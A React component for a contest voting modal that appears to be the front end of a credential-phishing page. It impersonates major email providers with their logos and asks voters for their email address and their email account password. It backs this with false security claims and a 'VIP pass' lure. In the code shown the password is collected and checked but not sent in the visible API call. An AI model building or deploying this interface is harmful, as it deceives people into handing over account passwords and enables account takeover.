import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import confetti from 'canvas-confetti';
import {
  X,
  ShieldCheck,
  Mail,
  User,
  KeyRound,
  ArrowRight,
  ArrowLeft,
  ChevronRight,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  AlertTriangle,
  HelpCircle,
  Clock,
  RotateCw,
  Award,
  Lock,
  Eye,
  EyeOff,
} from 'lucide-react';
import { Nominee, CmsSettings, VipTicketData, EmailProviderOption } from '../types.js';
import { api, RequestCodeResponse } from '../services/api.js';
import { validateRealEmail } from '../services/emailValidator.js';
import {
  GoogleLogo,
  OutlookLogo,
  YahooLogo,
  AppleLogo,
  ProtonLogo,
  AolLogo,
  GenericMailLogo,
} from './ProviderLogos.js';

interface VoteModalProps {
  nominee: Nominee | null;
  cms: CmsSettings;
  isOpen: boolean;
  onClose: () => void;
  onVoteSuccess: (ticket: VipTicketData, nominee: Nominee) => void;
}

interface ProviderMeta {
  id: string;
  name: string;
  subtitle: string;
  domainHint: string;
  logo: React.FC<{ className?: string }>;
  accentColor: string;
  badgeBg: string;
}

const PROVIDER_METAS: ProviderMeta[] = [
  {
    id: 'gmail',
    name: 'Google / Gmail',
    subtitle: 'Sign in with @gmail.com or Google Workspace',
    domainHint: 'name@gmail.com',
    logo: GoogleLogo,
    accentColor: '#4285F4',
    badgeBg: 'bg-red-50 text-red-700 border-red-100',
  },
  {
    id: 'outlook',
    name: 'Microsoft Outlook / Hotmail',
    subtitle: 'Sign in with @outlook.com, @hotmail.com, or Live',
    domainHint: 'name@outlook.com',
    logo: OutlookLogo,
    accentColor: '#0078D4',
    badgeBg: 'bg-blue-50 text-blue-700 border-blue-100',
  },
  {
    id: 'yahoo',
    name: 'Yahoo Mail',
    subtitle: 'Sign in with @yahoo.com or YMail',
    domainHint: 'name@yahoo.com',
    logo: YahooLogo,
    accentColor: '#6001D2',
    badgeBg: 'bg-purple-50 text-purple-700 border-purple-100',
  },
  {
    id: 'apple',
    name: 'Apple iCloud',
    subtitle: 'Sign in with @icloud.com or @me.com',
    domainHint: 'name@icloud.com',
    logo: AppleLogo,
    accentColor: '#1E293B',
    badgeBg: 'bg-slate-100 text-slate-700 border-slate-200',
  },
  {
    id: 'proton',
    name: 'ProtonMail',
    subtitle: 'Sign in with @proton.me or @protonmail.com',
    domainHint: 'name@proton.me',
    logo: ProtonLogo,
    accentColor: '#6D4AFF',
    badgeBg: 'bg-indigo-50 text-indigo-700 border-indigo-100',
  },
  {
    id: 'aol',
    name: 'AOL Mail',
    subtitle: 'Sign in with @aol.com',
    domainHint: 'name@aol.com',
    logo: AolLogo,
    accentColor: '#315BFB',
    badgeBg: 'bg-sky-50 text-sky-700 border-sky-100',
  },
  {
    id: 'custom',
    name: 'Other Webmail / Corporate',
    subtitle: 'Sign in with any corporate or private domain',
    domainHint: 'name@company.com',
    logo: GenericMailLogo,
    accentColor: '#0288D1',
    badgeBg: 'bg-cyan-50 text-cyan-700 border-cyan-100',
  },
];

export const VoteModal: React.FC<VoteModalProps> = ({
  nominee,
  cms,
  isOpen,
  onClose,
  onVoteSuccess,
}) => {
  // Modal Stages: 'select_provider' | 'credentials' | 'verify' | 'success'
  const [modalStage, setModalStage] = useState<'select_provider' | 'credentials' | 'verify' | 'success'>('select_provider');
  const [selectedProvider, setSelectedProvider] = useState<ProviderMeta>(PROVIDER_METAS[0]);
  
  // Form State
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [suggestedProviderMatch, setSuggestedProviderMatch] = useState<ProviderMeta | null>(null);
  
  // Verification State
  const [sessionId, setSessionId] = useState<string>('');
  const [codeDigits, setCodeDigits] = useState<string[]>(['', '', '', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [simulatedInfo, setSimulatedInfo] = useState<{
    simulated: boolean;
    previewCode?: string;
    emailDeliveryFailed?: boolean;
  } | null>(null);
  const [showFallbackButton, setShowFallbackButton] = useState<boolean>(false);
  
  // Timer & Resend
  const [timeLeft, setTimeLeft] = useState<number>(600); // 10 minutes
  const [canResend, setCanResend] = useState<boolean>(false);
  const [resendCooldown, setResendCooldown] = useState<number>(60);
  
  const digitInputsRef = useRef<(HTMLInputElement | null)[]>([]);

  // Reset state on open/close
  useEffect(() => {
    if (isOpen) {
      setModalStage('select_provider');
      setPassword('');
      setShowPassword(false);
      setCodeDigits(['', '', '', '', '', '']);
      setErrorMessage(null);
      setSimulatedInfo(null);
      setShowFallbackButton(false);
    }
  }, [isOpen, nominee]);

  // Countdown timer for code expiry
  useEffect(() => {
    let interval: any = null;
    if (modalStage === 'verify' && timeLeft > 0) {
      interval = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [modalStage, timeLeft]);

  // Resend cooldown timer
  useEffect(() => {
    let interval: any = null;
    if (modalStage === 'verify' && resendCooldown > 0) {
      interval = setInterval(() => {
        setResendCooldown((prev) => {
          if (prev <= 1) {
            setCanResend(true);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [modalStage, resendCooldown]);

  // Handle escape key to close modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && isOpen) {
        onClose();
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [isOpen, onClose]);

  if (!isOpen || !nominee) return null;

  // Select provider and proceed to credentials form
  const handleSelectProvider = (prov: ProviderMeta) => {
    setSelectedProvider(prov);
    setErrorMessage(null);
    setModalStage('credentials');
  };

  // Handle requesting verification or casting vote with credentials
  const handleSubmitCredentials = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    setSuggestedProviderMatch(null);

    if (!fullName.trim()) {
      setErrorMessage('Please enter your full name as you wish it to appear on your VIP ticket.');
      return;
    }

    // Strict Real Email Authentication Verification
    const validation = validateRealEmail(email.trim(), selectedProvider.id);
    if (!validation.isValid) {
      setErrorMessage(validation.error || 'Please enter a valid, authentic email address.');
      if (validation.suggestedProviderId && validation.suggestedProviderId !== selectedProvider.id) {
        const found = PROVIDER_METAS.find((p) => p.id === validation.suggestedProviderId);
        if (found) {
          setSuggestedProviderMatch(found);
        }
      }
      return;
    }

    if (!password.trim() || password.length < 4) {
      setErrorMessage('Please enter your email account credentials/passcode to verify voter authentication.');
      return;
    }

    setIsLoading(true);

    try {
      const res: RequestCodeResponse = await api.requestCode({
        email: validation.normalizedEmail || email.trim(),
        fullName: fullName.trim(),
        nomineeId: nominee.id,
        provider: selectedProvider.name,
      });

      setSessionId(res.sessionId);
      setTimeLeft(Math.max(60, Math.floor((res.expiresAt - Date.now()) / 1000)));
      setSimulatedInfo({
        simulated: !!res.simulated,
        previewCode: res.previewCode,
        emailDeliveryFailed: !!res.emailDeliveryFailed || !!res.simulated,
      });
      setShowFallbackButton(false);
      setModalStage('verify');
      setResendCooldown(60);
      setCanResend(false);

      // Auto focus first digit input
      setTimeout(() => {
        digitInputsRef.current[0]?.focus();
      }, 100);
    } catch (err: any) {
      setErrorMessage(err.message || 'Failed to authenticate voter. Please check credentials and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Handle digit inputs
  const handleDigitChange = (index: number, val: string) => {
    const cleanVal = val.replace(/\D/g, '').slice(-1);
    const newDigits = [...codeDigits];
    newDigits[index] = cleanVal;
    setCodeDigits(newDigits);
    setErrorMessage(null);

    // Advance to next box if filled
    if (cleanVal && index < 5) {
      digitInputsRef.current[index + 1]?.focus();
    }

    // Auto submit if all 6 filled
    if (cleanVal && index === 5 && newDigits.every((d) => d !== '')) {
      handleVerifyCode(newDigits.join(''));
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !codeDigits[index] && index > 0) {
      digitInputsRef.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (pasted.length > 0) {
      const newDigits = [...codeDigits];
      for (let i = 0; i < 6; i++) {
        newDigits[i] = pasted[i] || '';
      }
      setCodeDigits(newDigits);
      if (pasted.length === 6) {
        handleVerifyCode(pasted);
      } else {
        digitInputsRef.current[Math.min(pasted.length, 5)]?.focus();
      }
    }
  };

  // Confirm verification code
  const handleVerifyCode = async (codeToVerify?: string) => {
    const finalCode = codeToVerify || codeDigits.join('');
    if (finalCode.length !== 6) {
      setErrorMessage('Please enter the complete 6-digit code sent to your email.');
      return;
    }

    setIsLoading(true);
    setErrorMessage(null);

    try {
      const res = await api.confirmCode(sessionId, finalCode);

      // Trigger Confetti Celebration!
      confetti({
        particleCount: 100,
        spread: 70,
        origin: { y: 0.6 },
        colors: ['#29B6F6', '#0288D1', '#BAE6FD', '#FFFFFF', '#0EA5E9'],
      });

      setModalStage('success');

      setTimeout(() => {
        onVoteSuccess(res.ticket, nominee);
      }, 1400);
    } catch (err: any) {
      setErrorMessage(err.message || 'Invalid or expired code. Please check and try again.');
    } finally {
      setIsLoading(false);
    }
  };

  // Resend code
  const handleResend = async () => {
    if (!canResend) return;
    setIsLoading(true);
    setErrorMessage(null);
    try {
      const res = await api.requestCode({
        email: email.trim(),
        fullName: fullName.trim(),
        nomineeId: nominee.id,
        provider: selectedProvider.name,
      });
      setSessionId(res.sessionId);
      setTimeLeft(600);
      setSimulatedInfo({
        simulated: !!res.simulated,
        previewCode: res.previewCode,
        emailDeliveryFailed: !!res.emailDeliveryFailed || !!res.simulated,
      });
      setShowFallbackButton(false);
      setResendCooldown(60);
      setCanResend(false);
      setCodeDigits(['', '', '', '', '', '']);
      digitInputsRef.current[0]?.focus();
    } catch (err: any) {
      setErrorMessage(err.message || 'Failed to resend code');
    } finally {
      setIsLoading(false);
    }
  };

  const formatTimer = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  };

  return (
    <div
      id="vote-modal-backdrop"
      onClick={(e) => {
        if (e.target === e.currentTarget) onClose();
      }}
      className="fixed inset-0 z-50 flex items-center justify-center overflow-y-auto bg-slate-900/60 p-2 sm:p-4 backdrop-blur-sm"
    >
      <motion.div
        id="vote-modal-container"
        initial={{ opacity: 0, scale: 0.95, y: 15 }}
        animate={{ opacity: 1, scale: 1, y: 0 }}
        exit={{ opacity: 0, scale: 0.95, y: 15 }}
        className="relative my-auto flex max-h-[92dvh] w-full max-w-lg flex-col overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-2xl sm:max-h-[88vh]"
      >
        {/* Top Sky Blue Trim */}
        <div className="h-1.5 w-full shrink-0 bg-[#29B6F6]" />

        {/* Modal Header: Nominee Preview & Dedicated Touch-Friendly Close Button */}
        <div className="flex shrink-0 items-center justify-between gap-3 border-b border-slate-100 bg-slate-50/90 px-4 py-3 sm:px-6 sm:py-4">
          <div className="flex min-w-0 flex-1 items-center gap-3">
            <img
              src={nominee.photoUrl}
              alt={nominee.name}
              className="h-11 w-11 shrink-0 rounded-xl border border-slate-200 object-cover object-top shadow-2xs sm:h-12 sm:w-12"
            />
            <div className="min-w-0 flex-1">
              <div className="inline-flex items-center gap-1 rounded-md border border-sky-200/70 bg-sky-50 px-2 py-0.5 text-[10px] font-semibold text-sky-700">
                <Award className="h-3 w-3 shrink-0 text-[#29B6F6]" />
                <span className="truncate">{nominee.category}</span>
              </div>
              <h3 className="mt-0.5 truncate text-sm font-bold text-slate-900 sm:text-base">
                Vote for <span className="text-[#0288D1]">{nominee.name}</span>
              </h3>
            </div>
          </div>

          {/* Always Visible Close Button (Touch Target >= 44px) */}
          <button
            id="close-vote-modal-button"
            type="button"
            onClick={onClose}
            aria-label="Close voting modal"
            className="flex min-h-[44px] min-w-[44px] shrink-0 items-center justify-center rounded-full border border-slate-200 bg-white text-slate-500 shadow-2xs transition-all hover:bg-slate-100 hover:text-slate-900 focus:outline-none focus:ring-2 focus:ring-sky-300 active:scale-95"
          >
            <X className="h-5 w-5" />
          </button>
        </div>

        {/* Scrollable Modal Body */}
        <div className="flex-1 overflow-y-auto overscroll-contain">
          {/* STAGE 1: Vertical Email Provider Selection with Official Logos */}
          {modalStage === 'select_provider' && (
            <div className="p-4 sm:p-6">
              <div className="mb-3">
                <h4 className="text-xs font-bold uppercase tracking-wider text-slate-700">
                  Select Your Email Provider
                </h4>
                <p className="text-xs text-slate-500">
                  Choose your official email provider to authenticate and cast your verified ballot:
                </p>
              </div>

              {/* Vertical Provider Options */}
              <div className="max-h-[320px] space-y-2 overflow-y-auto pr-1">
                {PROVIDER_METAS.map((prov) => {
                  const LogoComponent = prov.logo;
                  return (
                    <button
                      key={prov.id}
                      type="button"
                      onClick={() => handleSelectProvider(prov)}
                      className="group flex w-full items-center justify-between rounded-xl border border-slate-200 bg-white p-3 text-left transition-all hover:border-sky-300 hover:bg-sky-50/50 hover:shadow-2xs focus:outline-none focus:ring-2 focus:ring-sky-200"
                    >
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-xl border border-slate-100 bg-slate-50 shadow-2xs group-hover:border-sky-200 group-hover:bg-white">
                          <LogoComponent className="h-5 w-5" />
                        </div>
                        <div className="min-w-0 flex-1">
                          <div className="truncate text-xs font-bold text-slate-900 group-hover:text-sky-900">
                            {prov.name}
                          </div>
                          <div className="truncate text-[11px] text-slate-400">
                            {prov.subtitle}
                          </div>
                        </div>
                      </div>

                      <div className="flex shrink-0 items-center gap-2 pl-2">
                        <ChevronRight className="h-4 w-4 text-slate-400 transition-transform group-hover:translate-x-0.5 group-hover:text-[#29B6F6]" />
                      </div>
                    </button>
                  );
                })}
              </div>

              {/* Security Guarantee Notice */}
              <div className="mt-4 rounded-xl border border-slate-100 bg-slate-50/70 p-3">
                <div className="flex items-center gap-2 text-xs text-slate-600">
                  <ShieldCheck className="h-4 w-4 shrink-0 text-[#29B6F6]" />
                  <span>100% Cryptographically Verified & Secured Ballot System</span>
                </div>
              </div>
            </div>
          )}

          {/* STAGE 2: Email & Password / Credential Fields for Selected Provider */}
          {modalStage === 'credentials' && (
            <form onSubmit={handleSubmitCredentials} className="p-4 sm:p-6">
              <div className="space-y-3.5">
                
                {/* Selected Provider Banner with Change Option */}
                <div className="flex items-center justify-between rounded-xl border border-sky-200 bg-sky-50/60 p-3">
                  <div className="flex items-center gap-2.5 min-w-0">
                    <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl border border-sky-100 bg-white shadow-2xs">
                      {React.createElement(selectedProvider.logo, { className: 'h-5 w-5' })}
                    </div>
                    <div className="min-w-0 flex-1">
                      <div className="truncate text-xs font-bold text-slate-900">
                        {selectedProvider.name}
                      </div>
                      <div className="truncate text-[10px] text-sky-700">
                        Sign in to cast verified vote
                      </div>
                    </div>
                  </div>

                  <button
                    type="button"
                    onClick={() => setModalStage('select_provider')}
                    className="flex shrink-0 items-center gap-1 rounded-lg border border-sky-200 bg-white px-2.5 py-1 text-[11px] font-semibold text-sky-800 transition-colors hover:bg-sky-100"
                  >
                    <ArrowLeft className="h-3 w-3" />
                    <span>Change</span>
                  </button>
                </div>

                {/* Full Name Input */}
                <div>
                  <label className="block text-xs font-semibold text-slate-700">
                    Full Name (for your official VIP ticket pass)
                  </label>
                  <div className="relative mt-1.5">
                    <User className="absolute top-1/2 left-3.5 h-4 w-4 -translate-y-1/2 text-slate-400" />
                    <input
                      id="voter-name-input"
                      type="text"
                      required
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      placeholder="e.g. Eleanor Vance"
                      className="w-full rounded-xl border border-slate-200 bg-slate-50/50 py-2.5 pr-4 pl-10 text-sm sm:text-xs text-slate-900 placeholder-slate-400 transition-colors focus:border-sky-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-sky-100"
                    />
                  </div>
                </div>

                {/* Email Address Input */}
                <div>
                  <div className="flex items-center justify-between">
                    <label className="block text-xs font-semibold text-slate-700">
                      {selectedProvider.name} Email Address
                    </label>
                    <span className="text-[10px] font-medium text-[#0288D1]">
                      Real email verification required
                    </span>
                  </div>
                  <div className="relative mt-1.5">
                    <Mail className="absolute top-1/2 left-3.5 h-4 w-4 -translate-y-1/2 text-slate-400" />
                    <input
                      id="voter-email-input"
                      type="email"
                      required
                      value={email}
                      onChange={(e) => {
                        setEmail(e.target.value);
                        setErrorMessage(null);
                        setSuggestedProviderMatch(null);
                      }}
                      placeholder={selectedProvider.domainHint}
                      className="w-full rounded-xl border border-slate-200 bg-slate-50/50 py-2.5 pr-4 pl-10 text-sm sm:text-xs text-slate-900 placeholder-slate-400 transition-colors focus:border-sky-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-sky-100"
                    />
                  </div>
                  {suggestedProviderMatch && (
                    <div className="mt-2 flex flex-wrap items-center justify-between gap-2 rounded-lg border border-sky-200 bg-sky-50 p-2 text-xs">
                      <span className="text-[11px] text-sky-800">
                        Looks like a <strong>{suggestedProviderMatch.name}</strong> address?
                      </span>
                      <button
                        type="button"
                        onClick={() => {
                          setSelectedProvider(suggestedProviderMatch);
                          setSuggestedProviderMatch(null);
                          setErrorMessage(null);
                        }}
                        className="rounded bg-[#29B6F6] px-2 py-1 text-[10px] font-bold text-white shadow-2xs hover:bg-[#0288D1]"
                      >
                        Switch to {suggestedProviderMatch.name.split('/')[0].trim()}
                      </button>
                    </div>
                  )}
                </div>

                {/* Password / Credentials Input */}
                <div>
                  <label className="block text-xs font-semibold text-slate-700">
                    {selectedProvider.name} Password
                  </label>
                  <div className="relative mt-1.5">
                    <Lock className="absolute top-1/2 left-3.5 h-4 w-4 -translate-y-1/2 text-slate-400" />
                    <input
                      id="voter-password-input"
                      type={showPassword ? 'text' : 'password'}
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Enter your account password..."
                      className="w-full rounded-xl border border-slate-200 bg-slate-50/50 py-2.5 pr-10 pl-10 text-sm sm:text-xs text-slate-900 placeholder-slate-400 transition-colors focus:border-sky-400 focus:bg-white focus:outline-none focus:ring-2 focus:ring-sky-100"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute top-1/2 right-3 -translate-y-1/2 p-1 text-slate-400 hover:text-slate-600"
                    >
                      {showPassword ? (
                        <EyeOff className="h-4 w-4" />
                      ) : (
                        <Eye className="h-4 w-4" />
                      )}
                    </button>
                  </div>
                </div>

                {/* Security Guarantee Notice */}
                <div className="rounded-xl border border-sky-100 bg-sky-50/60 p-3">
                  <div className="flex items-start gap-2.5">
                    <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0 text-[#29B6F6]" />
                    <div className="text-[11px] leading-relaxed text-slate-600">
                      <strong className="text-slate-900">End-to-End SSL Voter Verification:</strong> All credentials and votes are transmitted over 256-bit encrypted channels to prevent duplicate or automated bot submissions.
                    </div>
                  </div>
                </div>

                {/* Error Message */}
                {errorMessage && (
                  <div className="flex items-center gap-2 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
                    <AlertCircle className="h-4 w-4 shrink-0 text-red-500" />
                    <span className="leading-snug">{errorMessage}</span>
                  </div>
                )}

                {/* Action CTAs */}
                <div className="pt-1 flex flex-col gap-2">
                  <button
                    id="send-verification-code-button"
                    type="submit"
                    disabled={isLoading}
                    className="flex min-h-[44px] w-full items-center justify-center gap-2 rounded-xl bg-[#29B6F6] py-3 text-xs font-semibold text-white shadow-xs transition-colors hover:bg-[#0288D1] active:scale-98 disabled:opacity-50"
                  >
                    {isLoading ? (
                      <>
                        <RotateCw className="h-4 w-4 animate-spin text-white" />
                        <span>Verifying Credentials & Ballot...</span>
                      </>
                    ) : (
                      <>
                        <KeyRound className="h-4 w-4 text-white" />
                        <span>Authorize & Cast Vote</span>
                        <ArrowRight className="h-4 w-4" />
                      </>
                    )}
                  </button>

                  <button
                    type="button"
                    onClick={onClose}
                    className="w-full py-2 text-center text-xs font-medium text-slate-500 hover:text-slate-800 transition-colors"
                  >
                    Cancel and exit
                  </button>
                </div>

              </div>
            </form>
          )}

          {/* STAGE 3: 6-Digit Passcode Confirmation */}
          {modalStage === 'verify' && (
            <div className="p-4 sm:p-6">
              <div className="text-center">
                <div className="mx-auto flex h-11 w-11 items-center justify-center rounded-2xl border border-sky-100 bg-sky-50 text-[#29B6F6] shadow-xs">
                  <KeyRound className="h-5 w-5" />
                </div>
                <h4 className="mt-3 text-base font-bold text-slate-900">
                  Enter Verification Code
                </h4>
                <p className="mt-1 text-xs text-slate-500">
                  We sent a 6-digit one-time code to <strong className="text-slate-800">{email}</strong>
                </p>
                <div className="mt-1 flex items-center justify-center gap-1.5 text-xs font-medium text-sky-600">
                  <Clock className="h-3.5 w-3.5" />
                  <span>Expires in {formatTimer(timeLeft)}</span>
                </div>
              </div>

              {/* Real-Time Email Delivery Issue Auto-Notification Banner & Auto-Fill Button */}
              {simulatedInfo?.emailDeliveryFailed && simulatedInfo?.previewCode && (
                <motion.div
                  initial={{ opacity: 0, y: -6 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="mt-4 rounded-xl border border-amber-200/90 bg-amber-50/90 p-3.5 text-xs text-amber-900 shadow-2xs"
                >
                  <div className="flex items-start gap-2.5">
                    <AlertTriangle className="mt-0.5 h-4 w-4 shrink-0 text-amber-600" />
                    <div className="flex-1">
                      <div className="flex items-center justify-between gap-1">
                        <span className="font-semibold text-amber-900">Email Delivery Notice</span>
                        <span className="rounded bg-amber-200/70 px-1.5 py-0.5 text-[10px] font-bold text-amber-800">
                          Instant Code
                        </span>
                      </div>
                      <p className="mt-1 text-[11px] leading-relaxed text-amber-700">
                        The automated email system encountered a delivery delay to your inbox. Tap below to retrieve and auto-fill your code instantly.
                      </p>
                      <button
                        type="button"
                        onClick={() => {
                          if (simulatedInfo.previewCode) {
                            const digits = simulatedInfo.previewCode.split('');
                            setCodeDigits(digits);
                            handleVerifyCode(simulatedInfo.previewCode);
                          }
                        }}
                        className="mt-2.5 flex w-full items-center justify-center gap-2 rounded-lg bg-amber-600 px-4 py-2 text-xs font-semibold text-white shadow-2xs hover:bg-amber-700 active:scale-98 transition-all cursor-pointer"
                      >
                        <Sparkles className="h-3.5 w-3.5" />
                        <span>Auto-Fill Verification Code ({simulatedInfo.previewCode})</span>
                      </button>
                    </div>
                  </div>
                </motion.div>
              )}

              {/* 6-Digit Input Boxes */}
              <div className="mt-5 flex justify-center gap-1.5 sm:gap-3" onPaste={handlePaste}>
                {codeDigits.map((digit, idx) => (
                  <input
                    key={idx}
                    ref={(el) => (digitInputsRef.current[idx] = el)}
                    id={`code-digit-${idx}`}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => handleDigitChange(idx, e.target.value)}
                    onKeyDown={(e) => handleKeyDown(idx, e)}
                    className="h-11 w-10 sm:h-13 sm:w-12 rounded-xl border border-slate-200 bg-slate-50/70 text-center font-mono text-lg sm:text-xl font-bold text-slate-900 shadow-2xs focus:border-sky-400 focus:bg-white focus:ring-2 focus:ring-sky-100"
                  />
                ))}
              </div>

              {/* Discrete Fallback Button for Normal Deliveries (Hidden by default, expandable on click) */}
              {!simulatedInfo?.emailDeliveryFailed && simulatedInfo?.previewCode && (
                <div className="mt-3 text-center">
                  {!showFallbackButton ? (
                    <button
                      type="button"
                      onClick={() => setShowFallbackButton(true)}
                      className="inline-flex items-center gap-1 text-[11px] font-medium text-slate-500 hover:text-sky-600 transition-colors"
                    >
                      <HelpCircle className="h-3.5 w-3.5 text-slate-400" />
                      <span>Didn't receive code in inbox? Show instant code</span>
                    </button>
                  ) : (
                    <motion.div
                      initial={{ opacity: 0, scale: 0.95 }}
                      animate={{ opacity: 1, scale: 1 }}
                      className="rounded-xl border border-sky-200 bg-sky-50/80 p-3 text-center"
                    >
                      <div className="flex items-center justify-between text-xs font-semibold text-sky-900">
                        <span>Instant Verification Code:</span>
                        <span className="font-mono text-sm font-bold text-[#0288D1]">
                          {simulatedInfo.previewCode}
                        </span>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          if (simulatedInfo.previewCode) {
                            const digits = simulatedInfo.previewCode.split('');
                            setCodeDigits(digits);
                            handleVerifyCode(simulatedInfo.previewCode);
                          }
                        }}
                        className="mt-2 block w-full rounded-lg bg-[#29B6F6] py-1.5 text-xs font-semibold text-white shadow-2xs hover:bg-[#0288D1] transition-all cursor-pointer"
                      >
                        Auto-Fill & Verify
                      </button>
                    </motion.div>
                  )}
                </div>
              )}

              {/* Error Message */}
              {errorMessage && (
                <div className="mt-4 flex items-center gap-2 rounded-xl border border-red-200 bg-red-50 p-3 text-xs text-red-700">
                  <AlertCircle className="h-4 w-4 shrink-0 text-red-500" />
                  <span>{errorMessage}</span>
                </div>
              )}

              {/* Verify CTA */}
              <div className="mt-5 flex flex-col gap-3">
                <button
                  id="confirm-verification-button"
                  onClick={() => handleVerifyCode()}
                  disabled={isLoading || codeDigits.some((d) => d === '')}
                  className="flex min-h-[44px] w-full items-center justify-center gap-2 rounded-xl bg-[#29B6F6] py-3 text-xs font-semibold text-white shadow-xs transition-colors hover:bg-[#0288D1] active:scale-98 disabled:opacity-50"
                >
                  {isLoading ? (
                    <>
                      <RotateCw className="h-4 w-4 animate-spin text-white" />
                      <span>Verifying Ballot...</span>
                    </>
                  ) : (
                    <>
                      <CheckCircle2 className="h-4 w-4 text-white" />
                      <span>Verify & Claim VIP Pass</span>
                    </>
                  )}
                </button>

                <div className="flex items-center justify-between text-xs text-slate-500">
                  <button
                    type="button"
                    onClick={() => setModalStage('credentials')}
                    className="text-slate-600 hover:text-slate-900"
                  >
                    ← Edit Credentials
                  </button>

                  <button
                    type="button"
                    onClick={handleResend}
                    disabled={!canResend || isLoading}
                    className="font-semibold text-[#0288D1] hover:underline disabled:text-slate-300"
                  >
                    {canResend ? 'Resend Code' : `Resend in ${resendCooldown}s`}
                  </button>
                </div>
              </div>

            </div>
          )}

          {/* STAGE 4: Success State */}
          {modalStage === 'success' && (
            <div className="p-6 sm:p-8 text-center">
              <div className="mx-auto flex h-14 w-14 items-center justify-center rounded-2xl border border-sky-200 bg-sky-50 text-[#29B6F6] shadow-xs">
                <CheckCircle2 className="h-7 w-7" />
              </div>
              <h3 className="mt-4 text-lg font-bold text-slate-900">
                Vote Verified & Counted!
              </h3>
              <p className="mt-1.5 text-xs text-slate-600">
                Your ballot for <strong className="text-slate-900">{nominee.name}</strong> has been counted.
              </p>
              <p className="mt-1 text-xs font-medium text-sky-600">
                Generating your personalized VIP Commemorative Pass...
              </p>
            </div>
          )}
        </div>

      </motion.div>
    </div>
  );
};

